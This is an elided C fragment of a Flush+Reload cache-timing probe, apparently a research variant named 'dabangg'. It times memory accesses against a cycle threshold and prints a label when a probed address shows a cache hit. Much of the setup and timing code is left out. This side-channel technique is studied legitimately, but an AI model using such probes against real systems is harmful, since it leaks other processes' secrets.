...
void dabangg_flush_reload(void *addr, char *label, int i) {
    ...
    delta = newtime - time; 
    iter_no[i]++;
    if (delta < 125 && kpause[i] > 100 && sequence[i] > 3)
    {
        kpause[i] = 0;
        sequence[i] = 0;
        if(iter_no[i]-last_hit[i] < 100 && last_hit[i])  ;
        else{
            last_hit[i] = iter_no[i];
            printf("%s\n",label);      
        }
    }
    else if(delta < 125){
...
int main(int argc, char **argv) {
    ...
    for (int i = 0; i < num_probes; i++) {
        ...
        dabangg_flush_reload(addr + prb.offset, prb.label, i);
